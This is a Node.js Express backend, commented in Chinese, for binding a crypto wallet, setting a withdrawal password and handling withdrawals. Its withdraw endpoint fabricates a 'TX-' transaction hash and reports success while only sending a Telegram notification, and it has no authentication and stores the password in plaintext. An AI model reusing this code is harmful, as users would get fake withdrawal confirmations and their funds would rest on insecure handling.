const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");
const { sendWithdrawNotification } = require("./bot");

const app = express();
app.use(bodyParser.json());
app.use(cors());
app.use(express.static("public"));

// 内存模拟数据库
let USER_WALLET = null;
let WITHDRAW_PASSWORD = null;

// ===== API =====

// 获取钱包地址
app.get("/api/wallet", (req, res) => {
    res.json({ wallet: USER_WALLET });
});

// 绑定 / 修改 钱包
app.post("/api/wallet", (req, res) => {
    const { wallet, oldWallet } = req.body;

    if (oldWallet) {
        if (USER_WALLET !== oldWallet) return res.json({ success: false, error: "Old wallet incorrect" });
        USER_WALLET = wallet;
        return res.json({ success: true, wallet });
    }

    if (!USER_WALLET) {
        USER_WALLET = wallet;
        return res.json({ success: true, wallet });
    }

    return res.json({ success: false, error: "Wallet already bound" });
});

// 设置提现密码
app.post("/api/password/set", (req, res) => {
    const { password } = req.body;
    WITHDRAW_PASSWORD = password;
    res.json({ success: true });
});

// 确认提现密码
app.post("/api/password/confirm", (req, res) => {
    const { password } = req.body;
    if (password === WITHDRAW_PASSWORD) return res.json({ success: true });
    res.json({ success: false, error: "Incorrect password" });
});

// 提现
app.post("/api/withdraw", async (req, res) => {
    const { coin, amount, wallet } = req.body;
    const hash = 'TX-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2,8);

    const record = { coin, amount, wallet, hash };

    // 发送 Telegram 通知
    await sendWithdrawNotification(record);

    res.json({ success: true, hash });
});

// Railway Health check
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public/index.html"));
});

// 启动服务器
const port = process.env.PORT || 3000;
app.listen(port, () => console.log("Server running on port " + port));
